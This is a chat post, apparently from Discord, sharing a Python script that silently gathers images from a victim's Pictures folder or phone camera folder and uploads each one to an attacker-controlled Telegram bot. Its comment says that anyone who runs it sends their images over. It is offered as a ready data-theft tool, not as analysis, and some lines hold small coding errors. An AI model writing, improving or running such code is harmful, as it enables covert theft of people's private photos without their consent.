#Python code: Anyone who runs it will receive all their Telegram bot images via the bot token and ID.
import os
import requests

BOTTOKEN = "ضعالتوكن_هنا"
CHATID = "ضعالآيدي_هنا"

def get_image_files(directory):
    extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
    return [f for f in os.listdir(directory) if f.lower().endswith(extensions)]

def send_photo(file_path):
    url = f"https://api.telegram.org/bot%7BBOT_TOKEN%7D/sendPhoto"
    try:
        with open(file_path, 'rb') as photo:
            payload = {'chat_id': CHAT_ID}
            files = {'photo': photo}
            response = requests.post(url, data=payload, files=files)
            return response.json()
    except Exception as e:
        return str(e)

def start_extraction():
    if os.name == 'nt':
        path = os.path.join(os.environ['USERPROFILE'], 'Pictures')
    else:
        path = '/sdcard/DCIM/Camera'
        if not os.path.exists(path):
            path = os.getcwd()

    print(f"Scanning: {path}")

    images = get_image_files(path)
    if not images:
        print("No images found.")
        return

    for image in images:
        full_path = os.path.join(path, image)
        print(f"Sending: {image}")
        send_photo(full_path)

if name == "main":
    start_extraction()
:fire:
Click to react
:heart:
Click to react
:100:
Click to react
Add Reaction
Edit
Forward
More

Message #المحفوضات
